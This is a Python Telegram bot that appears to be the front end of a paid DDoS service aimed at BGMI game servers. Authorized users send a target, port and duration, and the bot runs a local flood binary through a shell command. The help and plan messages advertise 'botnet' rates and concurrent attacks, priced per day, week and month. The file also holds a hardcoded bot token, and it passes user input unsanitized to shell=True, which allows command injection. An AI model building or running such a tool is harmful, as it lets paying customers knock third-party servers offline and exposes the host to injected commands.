#!/usr/bin/python3

import telebot
import subprocess
import requests
import datetime
import os

# insert your Telegram bot token here
bot = telebot.TeleBot('7454964661:AAHdwBhy6QCpH5vT2wpfotZirDqXB-mw4eA')

# Admin user IDs
admin_id = ["", "", "", "5857557446"]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"


# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Function to read free user IDs and their credits from the file
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # Check if line is not empty
                    user_info = line.split()
                    if len(user_info) == 2:
                        user_id, credits = user_info
                        free_user_credits[user_id] = int(credits)
                    else:
                        print(f"Ignoring invalid line in free user file: {line}")
    except FileNotFoundError:
        pass


# List to store allowed user IDs
allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")


# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found ❌."
            else:
                file.truncate(0)
                response = "Logs cleared successfully ✅"
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_add = command[1]
            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                response = f"User {user_to_add} Added Successfully 👍."
            else:
                response = "User already exists 🤦‍♂️."
        else:
            response = "Please specify a user ID to add 😒."
    else:
        response = "😆𝘽𝙆𝙇. 𝙏𝙐𝙈𝙎𝙀 𝙉𝘼 𝙃𝙊 𝙋𝘼𝙔𝙀𝙂𝘼😃"

    bot.reply_to(message, response)



@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"User {user_to_remove} removed successfully 👍."
            else:
                response = f"User {user_to_remove} not found in the list ❌."
        else:
            response = '''Please Specify A User ID to Remove. 
✅ Usage: /remove <userid>'''
    else:
        response = "😆𝘽𝙆𝙇. 𝙏𝙐𝙈𝙎𝙀 𝙉𝘼 𝙃𝙊 𝙋𝘼𝙔𝙀𝙂𝘼😃"

    bot.reply_to(message, response)


@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "Logs are already cleared. No data found ❌."
                else:
                    file.truncate(0)
                    response = "Logs Cleared Successfully ✅"
        except FileNotFoundError:
            response = "Logs are already cleared ❌."
    else:
        response = "😆𝘽𝙆𝙇. 𝙏𝙐𝙈𝙎𝙀 𝙉𝘼 𝙃𝙊 𝙋𝘼𝙔𝙀𝙂𝘼😃"
    bot.reply_to(message, response)

 

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "No data found ❌"
        except FileNotFoundError:
            response = "No data found ❌"
    else:
        response = "😆𝘽𝙆𝙇. 𝙏𝙐𝙈𝙎𝙀 𝙉𝘼 𝙃𝙊 𝙋𝘼𝙔𝙀𝙂𝘼😃"
    bot.reply_to(message, response)


@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No data found ❌."
                bot.reply_to(message, response)
        else:
            response = "No data found ❌"
            bot.reply_to(message, response)
    else:
        response = "😆𝘽𝙆𝙇. 𝙏𝙐𝙈𝙎𝙀 𝙉𝘼 𝙃𝙊 𝙋𝘼𝙔𝙀𝙂𝘼😃"
        bot.reply_to(message, response)


@bot.message_handler(commands=['id'])
def show_user_id(message):
    user_id = str(message.chat.id)
    response = f"🤖Your ID: {user_id}"
    bot.reply_to(message, response)

# Function to handle the reply when free users run the /bgmi command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"{username}, 🎉🎉𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n★ 𝐓𝐚𝐫𝐠𝐞𝐭 ★: {target}\n✰ 𝐏𝐨𝐫𝐭 ✰: {port}\n🅃🄸🄼🄴: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n★ 𝐌𝐞𝐭𝐡𝐨𝐝 ★: BGMI\n\n🔻S4 ФFFICIДL🔻"
    bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

COOLDOWN_TIME =0

# Handler for /bgmi command
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 180:
                response = "👍𝘼𝙏𝙏𝘼𝘾𝙆 𝘿𝙊𝙉𝙀👍 𝙈𝘼𝙎𝙎𝘼𝙂𝙀 𝘼𝘼𝙉𝙀 𝙆𝙀 𝘽𝘼𝘼𝘿 𝙏𝙍𝙔 𝙆𝙍𝙊"
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # Convert time to integer
            time = int(command[3])  # Convert port to integer
            if time > 181:
                response = "🤬𝘽𝙆𝙇. 𝙏𝙄𝙈𝙀 𝙆𝘼𝙈 𝘿𝘼𝙇 𝙉𝘼 - 180"
            else:
                record_command_logs(user_id, '/bgmi', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                full_command = f"./bgmi {target} {port} {time} 200"
                subprocess.run(full_command, shell=True)
                response = f"👍𝘼𝙩𝙩𝙖𝙘𝙠 𝘿𝙊𝙉𝙀👍 \n\n★ 𝐓𝐚𝐫𝐠𝐞𝐭 ★ {target} \n✰ 𝐏𝐨𝐫𝐭 ✰ {port} \n🅃🄸🄼🄴 {time}\n\n🔻S4 ФFFICIДL🔻"
        else:
            response = "✅ 𝙇𝙊𝙃𝘼 𝙂𝘼𝙍𝘼𝙈 𝙃 ✅ :- \n/bgmi <target> <port> <time>"  # Updated command syntax
    else:
        response = "❌ 🛑𝘼𝙎𝙎𝙀𝘾𝙀𝙎 𝙇𝙀 𝙇𝙀 𝘽𝙍𝙊🛑 ❌."

    bot.reply_to(message, response)



# Add /mylogs command to display logs recorded for bgmi and website commands
@bot.message_handler(commands=['mylogs'])
def show_command_logs(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        try:
            with open(LOG_FILE, "r") as file:
                command_logs = file.readlines()
                user_logs = [log for log in command_logs if f"UserID: {user_id}" in log]
                if user_logs:
                    response = "Your Command Logs:\n" + "".join(user_logs)
                else:
                    response = "❌ No Command Logs Found For You ❌."
        except FileNotFoundError:
            response = "No command logs found."
    else:
        response = "😆𝘽𝙆𝙇. 𝙏𝙐𝙈𝙎𝙀 𝙉𝘼 𝙃𝙊 𝙋𝘼𝙔𝙀𝙂𝘼😃"

    bot.reply_to(message, response)


@bot.message_handler(commands=['help'])
def show_help(message):
    help_text ='''🤖 Available commands:
💥 /bgmi : 𝙈𝙚𝙩𝙝𝙤𝙙 𝙁𝙤𝙧 𝘽𝙜𝙢𝙞 𝙎𝙚𝙧𝙫𝙚𝙧𝙨 
💥 /rules : 𝙋𝙡𝙚𝙖𝙨𝙚 𝘾𝙝𝙚𝙘𝙠 𝘽𝙚𝙛𝙤𝙧𝙚 𝙐𝙨𝙚
💥 /mylogs : 𝙏𝙤 𝘾𝙝𝙚𝙘𝙠 𝙔𝙤𝙪𝙧 𝙍𝙚𝙘𝙚𝙣𝙩𝙨 𝘼𝙩𝙩𝙖𝙘𝙠𝙨
💥 /plan : 𝘾𝙝𝙚𝙘𝙠𝙤𝙪𝙩 𝙊𝙪𝙧 𝘽𝙤𝙩𝙣𝙚𝙩 𝙍𝙖𝙩𝙚𝙨

★彡[ᴘᴀᴘᴀ ɢ ᴋɪ ᴄᴏᴍᴍᴀɴᴅ😆]彡★
💥 /admincmd : 𝙎𝙝𝙤𝙬𝙨 𝘼𝙡𝙡 𝙋𝘼𝙋𝘼 𝙂 𝙆𝙄 𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙨


'''
    for handler in bot.message_handlers:
        if hasattr(handler, 'commands'):
            if message.text.startswith('/help'):
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
            elif handler.doc and 'admin' in handler.doc.lower():
                continue
            else:
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f'''❤️𝙒𝙚𝙡𝙘𝙤𝙢𝙚 𝙩𝙤 𝙎4 𝙛𝙖𝙢𝙞𝙡𝙮❤️  \n{user_name}! \n★彡[ᴛᴜᴍ ᴍᴜᴊᴇ ᴄʜᴏʀ ᴋᴀʀ ᴍᴛ ᴊᴀɴᴀ ʙᴀʙᴜ😉]彡★
𒆜🤖🆃🆁🆈 🆃🅾 🆁🆄🅽 🆃🅷🅸🆂 🅲🅾🅼🅼🅰🅽🅳𒆜𓊉 : /help 
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} Please Follow These Rules ⚠️:

1. Dont Run Too Many Attacks !! Cause A Ban From Bot
2. Dont Run 2 Attacks At Same Time Becz If U Then U Got Banned From Bot. 
3. We Daily Checks The Logs So Follow these rules to avoid Ban!!'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, ★彡[ʙʀᴏᴛʜᴇʀ ᴠᴀꜱᴇ ᴛᴏ ʜᴍᴀʀᴇ ꜱᴀʀᴇ ʙᴏᴛ ᴀᴄʜᴇ ʙᴜᴛ ᴛᴜᴍᴇ ᴋᴜᴄʜ ʙᴇꜱᴛ ʙᴏᴛ ᴅᴇɴɢᴇ🥰]彡★!:

Vip 🌟 :
-> Attack Time : 200 (S)
> After Attack Limit : 3 Min
-> Concurrents Attack : 300

Pr-ice List💸 :
Day-->150 Rs
Week-->700 Rs
Month-->1800 Rs
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['admincmd'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Admin Commands Are Here!!:

💥 /add <userId> : Add a User.
💥 /remove <userid> Remove a User.
💥 /allusers : Authorised Users Lists.
💥 /logs : All Users Logs.
💥 /broadcast : Broadcast a Message.
💥 /clearlogs : Clear The Logs File.
❤️ /info: public source.
'''
    bot.reply_to(message, response)


@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "⚠️ Message To All Users By Admin:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "Broadcast Message Sent Successfully To All Users 👍."
        else:
            response = "🤖 Please Provide A Message To Broadcast."
    else:
        response = "😆𝘽𝙆𝙇. 𝙏𝙐𝙈𝙎𝙀 𝙉𝘼 𝙃𝙊 𝙋𝘼𝙔𝙀𝙂𝘼😃"

    bot.reply_to(message, response)




bot.polling()
